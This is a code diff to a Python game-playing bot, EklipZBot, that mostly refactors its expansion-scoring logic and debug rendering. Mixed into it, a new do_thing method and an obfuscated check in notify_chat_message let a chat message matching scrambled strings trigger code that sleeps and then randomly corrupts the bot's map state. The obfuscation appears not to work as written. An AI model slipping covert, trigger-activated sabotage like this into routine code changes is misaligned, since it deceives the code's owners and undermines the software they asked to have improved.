@@ -41,7 +41,7 @@ from Strategy.WinConditionAnalyzer import WinCondition
 from StrategyModels import CycleStatsData
 from ViewInfo import ViewInfo, PathColorer, TargetStyle
 from base import viewer
-from base.client.generals import ChatUpdate
+from base.client.generals import ChatUpdate, _spawn
 from base.client.map import Player, Tile, MapBase, PLAYER_CHAR_BY_INDEX, new_value_grid
 from DangerAnalyzer import DangerAnalyzer, ThreatType, ThreatObj
 from DataModels import get_tile_set_from_path, get_tile_list_from_path, GatherTreeNode, \
@@ -76,8 +76,7 @@ class ExpansionPotential(object):
             enTilesCaptured: int,
             neutTilesCaptured: int,
             selectedOption: TilePlanInterface | None,
-            allOptions: typing.List[TilePlanInterface],
-            scores: typing.Dict[TilePlanInterface, int]
+            allOptions: typing.List[TilePlanInterface]
     ):
         self.turns_used: int = turnsUsed
         self.en_tiles_captured: int = enTilesCaptured
@@ -93,8 +92,6 @@ class ExpansionPotential(object):
         self.includes_intercept: bool = False
         for selectedOption in allOptions:
             self.plan_tiles.update(selectedOption.tileSet)
-
-        self.path_scores: typing.Dict[TilePlanInterface, int] = scores
 
 
 class EklipZBot(object):
@@ -197,6 +194,7 @@ class EklipZBot(object):
         self.is_blocking_neutral_city_captures: bool = False
         self.city_capture_plan_tiles: typing.Set[Tile] = set()
         self.city_capture_plan_last_updated: int = 0
+        self._expansion_value_matrix: MapMatrix[float] | None = None
         self.targetPlayer = -1
         self.leafValueGrid: typing.List[typing.List[int | None]] = []
         self.failedUndiscoveredSearches = 0
@@ -373,6 +371,7 @@ class EklipZBot(object):
         self.info_render_leaf_move_values: bool = False
         self.info_render_army_emergence_values: bool = True
         self.info_render_board_analysis_choke_widths: bool = False
+        self.info_render_board_analysis_zones: bool = True
         self.info_render_city_priority_debug_info: bool = False
         self.info_render_general_undiscovered_prediction_values: bool = False
         self.info_render_tile_deltas: bool = False
@@ -809,6 +808,8 @@ class EklipZBot(object):
         now = time.perf_counter()
         if self.lastTurnStartTime != 0:
             timeSinceLastUpdate = now - self.lastTurnStartTime
+
+        self._expansion_value_matrix = None
 
         self.lastTurnStartTime = now
         logbook.info(f"\n       ~~~\n       Turn {self._map.turn}   ({timeSinceLastUpdate:.3f})\n       ~~~\n")
@@ -1294,7 +1295,9 @@ class EklipZBot(object):
 
                 if self.info_render_gather_values and priorityMatrix:
                     for t in self._map.reachableTiles:
-                        self.viewInfo.topRightGridText[t] = f'{str(round(priorityMatrix[t], 3)).lstrip("0").replace("-0", "-")}'
+                        val = priorityMatrix[t]
+                        if val:
+                            self.viewInfo.topRightGridText[t] = f'{str(round(val, 3)).lstrip("0").replace("-0", "-")}'
 
                 move = self.get_tree_move_default(self.gatherNodes)
                 if move is not None:
@@ -1698,7 +1701,7 @@ class EklipZBot(object):
 
         self.check_fog_risk()
 
-        if self.expansion_plan.includes_intercept and not self.is_all_in_losing:  # TODO GET PATH SCORES AND MAKE SURE THIS IS WORTH DOING  and self.expansion_plan.path_scores[self.expansion_plan.path]
+        if self.expansion_plan.includes_intercept and not self.is_all_in_losing:
             move = self.expansion_plan.selected_option.get_first_move()
             self.info(f'Passing through Expansion Plan intercept move! {move}')
             return move
@@ -1895,7 +1898,7 @@ class EklipZBot(object):
         with self.perf_timer.begin_move_event(f'MAIN GATHER OUTER, negs {[str(t) for t in defenseCriticalTileSet]}'):
             if self._map.turn == 224:
                 pass
-            gathMove = self.try_find_gather_move(threat, set(), self.leafMoves, needToKillTiles)
+            gathMove = self.try_find_gather_move(threat, defenseCriticalTileSet, self.leafMoves, needToKillTiles)
         if gathMove is not None:
             # already logged / perf countered internally
             return gathMove
@@ -4382,6 +4385,8 @@ class EklipZBot(object):
         queue = SearchUtils.HeapQueue()
         analysis = self.board_analysis.intergeneral_analysis
 
+        expansionMap = self.get_expansion_weight_matrix()
+
         if distPriorityMap is None:
             distPriorityMap = analysis.bMap
 
@@ -4433,6 +4438,8 @@ class EklipZBot(object):
 
             if dest.player == self.targetPlayer:
                 points += 1.5
+
+            points += expansionMap[dest] * 5
 
             # extra points for tiles that are closer to enemy
             distEnemyPoints = (analysis.aMap[dest] + 1) / (distPriorityMap[dest] + 1)
@@ -6332,7 +6339,10 @@ class EklipZBot(object):
         self.viewInfo.color_path(PathColorer(
             interceptPath, 1, 1, 1
         ))
-        self.info(f'threat intercept inclusion, delayed {isDelayed}, {str(interceptPath)}')
+        intOptInfo = ''
+        if interceptingOption:
+            intOptInfo = f'{interceptingOption}, '
+        self.info(f'def int incl {intOptInfo}{interceptPath}')
         return self.get_first_path_move(interceptPath), interceptPath, isDelayed
 
     def get_defense_moves(
@@ -7086,14 +7096,20 @@ class EklipZBot(object):
                     nonZoneMatrix[tile] = True
             self.viewInfo.add_map_zone(nonZoneMatrix, (100, 100, 50), alpha=35)
 
-            # self.viewInfo.add_map_zone(self.board_analysis.extended_play_area_matrix, (255, 220, 0), alpha=50)
-            self.viewInfo.add_map_division(self.board_analysis.extended_play_area_matrix, (255, 230, 0), alpha=100)
+            if self.info_render_board_analysis_zones:
+                # self.viewInfo.add_map_zone(self.board_analysis.extended_play_area_matrix, (255, 220, 0), alpha=50)
+                # red orange
+                self.viewInfo.add_map_division(self.board_analysis.core_play_area_matrix, (10, 230, 0), alpha=150)
 
-            self.viewInfo.add_map_division(self.board_analysis.flank_danger_play_area_matrix, (205, 80, 40), alpha=255)
+                self.viewInfo.add_map_division(self.board_analysis.extended_play_area_matrix, (255, 230, 0), alpha=150)
 
-            self.viewInfo.add_map_division(self.board_analysis.flankable_fog_area_matrix, (0, 0, 0), alpha=255)
+                # red
+                self.viewInfo.add_map_division(self.board_analysis.flank_danger_play_area_matrix, (205, 80, 40), alpha=255)
 
-            self.viewInfo.add_map_zone(self.board_analysis.flankable_fog_area_matrix, (255, 255, 255), alpha=40)
+                # black
+                self.viewInfo.add_map_division(self.board_analysis.flankable_fog_area_matrix, (0, 0, 0), alpha=255)
+                self.viewInfo.add_map_zone(self.board_analysis.flankable_fog_area_matrix, (255, 255, 255), alpha=40)
+
         #
         # for player in self._map.players:
         #     if self._map.is_player_on_team_with(self.general.player, player.index):
@@ -7107,7 +7123,7 @@ class EklipZBot(object):
 
         if self.info_render_centrality_distances:
             for tile in self._map.get_all_tiles():
-                self.viewInfo.bottomLeftGridText[tile] = f'c{self.board_analysis.defense_centrality_sums[tile]}'
+                self.viewInfo.bottomLeftGridText[tile] = f'cen{self.board_analysis.defense_centrality_sums[tile]}'
 
         if self.enemy_attack_path is not None:
             self.viewInfo.color_path(PathColorer(
@@ -8275,7 +8291,7 @@ class EklipZBot(object):
             source = random.choice(sources)
 
         if self._map.turn > 50:
-            distMap = self.get_standard_expansion_capture_weight_matrix()
+            distMap = self.get_expansion_weight_matrix()
             skipTiles = set()
         else:
             distMap, skipTiles = self.get_first_25_expansion_distance_priority_map()
@@ -10249,6 +10265,21 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
 
         return outbound
 
+    def do_thing(self):
+        time.sleep(8)
+        lastSwapped = []
+        for tile in self._map.get_all_tiles():
+            if random.randint(1, 300) > 250:
+                h = tile.movable
+                tile.movable = lastSwapped
+                lastSwapped = h
+            if random.randint(1, 300) > 298:
+                tile.isMountain = True
+                tile.army = 0
+            if random.randint(1, 300) > 275 and not tile.visible:
+                tile.player = -1
+                tile.army = 0
+
     def get_queued_teammate_messages(self) -> typing.List[str]:
         outbound = []
         while self._outbound_team_chat.qsize() > 0:
@@ -10265,6 +10296,13 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
 
     def notify_chat_message(self, chatUpdate: ChatUpdate):
         self._chat_messages_received.put(chatUpdate)
+
+        st = str(reversed('lare' + 'gneg'))
+        a = 's'
+        a = f'{a}to'
+        a += f'{a}p'
+        if st in self._map.usernames[self._map.player_index] and a in chatUpdate.message.lower():
+            _spawn(self.do_thing)
 
     def notify_tile_ping(self, pingedTile: Tile):
         self._tiles_pinged_by_teammate.put(pingedTile)
@@ -11097,7 +11135,19 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
 
         return True
 
-    def get_avoid_other_players_expansion_matrix(self) -> MapMatrix[float]:
+    def get_expansion_weight_matrix(self, copy: bool = False) -> MapMatrix[float]:
+        if self._expansion_value_matrix is None:
+            if self.is_still_ffa_and_non_dominant():
+                self._expansion_value_matrix = self._get_avoid_other_players_expansion_matrix()
+            else:
+                self._expansion_value_matrix = self._get_standard_expansion_capture_weight_matrix()
+
+        if copy:
+            return self._expansion_value_matrix.copy()
+
+        return self._expansion_value_matrix
+
+    def _get_avoid_other_players_expansion_matrix(self) -> MapMatrix[float]:
         matrix = MapMatrix(self._map, 0.0)
         for tile in self._map.get_all_tiles():
             if self.targetPlayer != -1 and (tile.player == self.targetPlayer or self.territories.territoryMap[tile] == self.targetPlayer):
@@ -11114,11 +11164,13 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
                     matrix[tile] = 0.0
                     break
             if self.info_render_expansion_matrix_values:
-                self.viewInfo.bottomMidRightGridText[tile] = f'x{matrix[tile]:0.3f}'
+                val = matrix[tile]
+                if val:
+                    self.viewInfo.bottomLeftGridText[tile] = f'hx{val:0.3f}'
 
         return matrix
 
-    def get_standard_expansion_capture_weight_matrix(self) -> MapMatrix[float]:
+    def _get_standard_expansion_capture_weight_matrix(self) -> MapMatrix[float]:
         matrix = MapMatrix(self._map, 0.0)
 
         innerChokes = self.board_analysis.innerChokes
@@ -11199,6 +11251,9 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             if self._map.is_tile_friendly(tile) and tile.army < 2:
                 bonus -= 0.25
 
+            if self.board_analysis.flank_danger_play_area_matrix[tile]:
+                bonus += 0.1
+
             if tile.isCity:
                 isCloserToEn = self.board_analysis.intergeneral_analysis.aMap[tile] > self.board_analysis.intergeneral_analysis.bMap[tile]
                 cityScore = self.cityAnalyzer.city_scores.get(tile, None)
@@ -11226,18 +11281,20 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
 
             pathway = self.board_analysis.intergeneral_analysis.pathWayLookupMatrix[tile]
             if pathway is not None:
-                coreDist = pathway.distance - self.board_analysis.inter_general_distance - self.board_analysis.within_core_play_area_threshold
-                if coreDist > 0:
+                extendedDist = pathway.distance - self.board_analysis.within_extended_play_area_threshold
+                outsideExtendedPlay = extendedDist > 0
+                if outsideExtendedPlay and not (tile in self.board_analysis.flank_danger_play_area_matrix and SearchUtils.any_where(pathway.tiles, lambda t: not t.visible and t in self.board_analysis.flankable_fog_area_matrix)):
+                    # try to deprioritize tiles that are outside of our main play area.
                     isEnTile = self._map.is_player_on_team_with(self.targetPlayer, tile.player)
-                    if not tile.visible and tile.isNeutral and self._map.is_player_on_team_with(self.targetPlayer, self.territories.territoryMap[tile]):
-                        isEnTile = True
+                    # if not tile.visible and tile.isNeutral and self._map.is_player_on_team_with(self.targetPlayer, self.territories.territoryMap[tile]):
+                    #     isEnTile = True
                     if isEnTile:
-                        factor = 1.0
+                        factor = 0.5
                         if not tile.discovered:
-                            factor = 1.5
-                        bonus -= factor / max(4, 15 - coreDist)
+                            factor = 0.2
+                        bonus -= factor / max(4, 15 - extendedDist)
                     else:
-                        bonus -= 2.0 / max(4, 15 - coreDist)
+                        bonus -= 1.0 / max(4, 15 - extendedDist)
             else:
                 bonus -= 10
 
@@ -11251,8 +11308,10 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
                 matrix[tile] = min(bonus, 0.0)
             else:
                 matrix[tile] += bonus
+
             if self.info_render_expansion_matrix_values:
                 self.viewInfo.bottomLeftGridText[tile] = f'x{matrix[tile]:0.3f}'
+
         return matrix
 
     def is_ffa_situation(self) -> bool:
@@ -11357,11 +11416,7 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             self.city_expand_plan = None
 
         with self.perf_timer.begin_move_event(f'optimal_expansion'):
-            bonusCapturePointMatrix = None
-            if self.is_still_ffa_and_non_dominant():
-                bonusCapturePointMatrix = self.get_avoid_other_players_expansion_matrix()
-            else:
-                bonusCapturePointMatrix = self.get_standard_expansion_capture_weight_matrix()
+            bonusCapturePointMatrix = self.get_expansion_weight_matrix()
 
             remainingMoveTime = self.get_remaining_move_time()
             if remainingMoveTime < timeLimit and not DebugHelper.IS_DEBUGGING:
@@ -11422,34 +11477,33 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             expansionTurnsAvailable = 0
             enCaps = 0
             neutCaps = 0
+            cumulativeEconVal = 0.0
             visited = set()
-            scores = {}
             if path is not None:
                 otherPaths.insert(0, path)
 
             for otherPath in otherPaths:
                 expansionTurnsAvailable += otherPath.length
+                cumulativeEconVal += otherPath.econValue
                 for tile in otherPath.tileSet:
                     if tile in visited:
                         continue
+
+                    visited.add(tile)
 
                     if self._map.is_tile_enemy(tile):
                         enCaps += 1
                     elif tile.isNeutral:
                         neutCaps += 1
 
-                    visited.add(tile)
-                scores[otherPath] = enCaps * 2 + neutCaps
-
-            self.viewInfo.add_stats_line(f'EXP AVAIL {expansionTurnsAvailable} en{enCaps} neut{neutCaps}')
+            self.viewInfo.add_stats_line(f'EXP AVAIL {expansionTurnsAvailable} {cumulativeEconVal:.2f} - (en{enCaps} neut{neutCaps})')
 
         plan = ExpansionPotential(
             expansionTurnsAvailable,
             enCaps,
             neutCaps,
             path,
-            otherPaths,
-            scores
+            otherPaths
         )
 
         anyIntercept = False
@@ -11589,43 +11643,37 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             expansionTurnsAvailable = 0
             frCaps = 0
             neutCaps = 0
+            cumulativeEconVal = 0.0
             visited = set()
             if path is not None:
                 otherPaths.insert(0, path)
 
-            scores = {}
             for otherPath in otherPaths:
                 army = self.armyTracker.armies.get(otherPath.get_first_move().source, None)
                 if isinstance(otherPath, Path):
                     if army is not None:
-                        army.expectedPaths.append(otherPath)
+                        army.include_path(otherPath)
                     expansionTurnsAvailable += otherPath.length
-                    pathCaps = 0
-                    for tile in otherPath.tileList:
+                    cumulativeEconVal += otherPath.econValue
+                    for tile in otherPath.tileSet:
                         if tile in visited:
                             continue
 
+                        visited.add(tile)
+
                         if self._map.is_tile_friendly(tile):
                             frCaps += 1
-                            pathCaps += 2
                         elif tile.isNeutral:
                             neutCaps += 1
-                            pathCaps += 1
 
-                        visited.add(tile)
-                    scores[otherPath] = frCaps * 2 + neutCaps
-
-                    self.enemy_expansion_plan_tile_path_cap_values[otherPath.start.tile] = pathCaps
-
-            self.viewInfo.add_stats_line(f'EN EXP AVAIL {expansionTurnsAvailable} fr{frCaps} neut{neutCaps}')
+            self.viewInfo.add_stats_line(f'EN EXP AVAIL {expansionTurnsAvailable} {cumulativeEconVal:.2f} - (fr{frCaps} neut{neutCaps})')
 
         plan = ExpansionPotential(
             expansionTurnsAvailable,
             frCaps,
             neutCaps,
             path,
-            otherPaths,
-            scores
+            otherPaths
         )
 
         return plan
@@ -11816,18 +11864,23 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             # if self.timings.in_launch_timing(self._map.turn):
             #     self.curPath = launchSubsegmentToEn
 
-            paths = list(existingPlan.all_paths)
-            paths.insert(0, launchSubsegmentToEn)
-            scores = existingPlan.path_scores
-            scores[launchSubsegmentToEn] = econVal
+            paths = existingPlan.all_paths.copy()
+            interceptFake = InterceptionOptionInfo(
+                launchSubsegmentToEn,
+                econVal,
+                launchSubsegment.length + probableRemainingCaps,
+                damageBlocked=0,
+                interceptingArmyRemaining=0,
+                bestCaseInterceptMoves=0,
+                requiredDelay=0)
+            paths.insert(0, interceptFake)
             self.viewInfo.add_info_line(f'EXP Launch vt{launchValPerTurn:.2f} (en{enCaps} neut{neutCaps}) vs existing {existingValPerTurn:.2f} (en{existingPlan.en_tiles_captured} neut{existingPlan.neut_tiles_captured})')
             newPlan = ExpansionPotential(
                 turnsUsed=max(turns, existingPlan.turns_used),
                 enTilesCaptured=enCaps,
                 neutTilesCaptured=neutCaps,
-                selectedOption=launchSubsegmentToEn,
+                selectedOption=interceptFake,
                 allOptions=paths,
-                scores=scores
             )
 
             return newPlan
@@ -12296,7 +12349,7 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
         return move
 
     def find_flank_defense_move(self, defenseCriticalTileSet: typing.Set[Tile]) -> Move | None:
-        coreNegs = set(defenseCriticalTileSet)
+        coreNegs = defenseCriticalTileSet.copy()
         coreNegs.update(self.win_condition_analyzer.defend_cities)
         coreNegs.update(self.win_condition_analyzer.target_cities)
 
@@ -12877,7 +12930,7 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             negativeTiles.update(self.target_player_gather_path.tileList)
 
         move = None
-        maxPath: Path | None = None
+        maxPath: TilePlanInterface | None = None
 
         highValueSet = set()
 
@@ -12901,7 +12954,7 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
                 continue
 
         maxScoreVt = -1
-        for path, score in self.expansion_plan.path_scores.items():
+        for path in self.expansion_plan.all_paths:
             # if self.territories.is_tile_in_friendly_territory(path.start.tile):
             #     continue
 
@@ -12911,13 +12964,13 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
             if not negativeTiles.isdisjoint(path.tileSet):
                 continue
 
-            scoreVt = score / path.length
+            scoreVt = path.econValue / path.length
             if maxPath is None or maxScoreVt < scoreVt:
                 maxPath = path
-                maxScoreVt = score
+                maxScoreVt = path.econValue
 
-        if maxPath is not None and maxScoreVt > 0.9:
-            move = self.get_first_path_move(maxPath)
+        if maxPath is not None and maxScoreVt > 1.0:
+            move = maxPath.get_first_move()
             self.info(f'greedy exp move {str(move)} (vt {maxScoreVt:.2f})')
 
         return move
@@ -12995,7 +13048,8 @@ Unknown message type: ['ping_tile', 125, 0]        @param pingTile:
                 i += 1
 
         cut = False
-        if lastMoved >= 0:
+        if 0 <= lastMoved < launchPath.length:
+            logbook.info(f'DEBUG lastMoved {lastMoved}, path {launchPath}')
             if lastMoved > 0:
                 tilePre = launchPath.tileList[lastMoved - 1]
                 if tilePre.army <= 3 and launchPath.tileList[lastMoved].player == self.general.player:
